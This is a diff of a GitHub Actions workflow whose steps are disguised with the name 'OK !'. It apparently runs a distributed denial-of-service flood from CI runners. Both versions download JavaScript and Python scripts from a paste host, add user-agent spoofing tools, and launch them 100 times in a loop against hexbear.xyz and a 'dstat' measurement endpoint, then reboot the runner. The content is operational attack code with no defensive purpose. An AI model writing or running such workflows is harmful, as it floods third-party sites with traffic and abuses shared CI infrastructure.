@@ -15,14 +15,14 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget https://curl.by/fje4e/allah.js
-          wget https://curl.by/UYgdD/fres.txt
-          wget https://curl.by/_m4jT/ua.txt
-          npm install fake-useragent colors header-generator user-agents axios
-          chmod +x allah.js
+          pip install git+https://github.com/QuantumLLC/Archer
+          wget https://curl.by/eoors/raww.js
+          wget https://curl.by/4W4K-/Test.py
+          chmod +x raww.js
+          chmod +x Test.py
           PIDS=()
           for i in {1..100}; do
-            timeout 85 node allah.js https://hexbear.xyz/ 80 64 12 fres.txt
+            timeout 100 python3 Test.py https://dstat.hexbear.xyz/xd && noder raww.js https://dstat.hexbear.xyz/xd 100
             PIDS+=($!)
           done
           
@@ -31,7 +31,7 @@ jobs:
           done
 
       - name: OK !
-        run: sleep 85
+        run: sleep 100
         
       - name: OK !
         run: sudo reboot
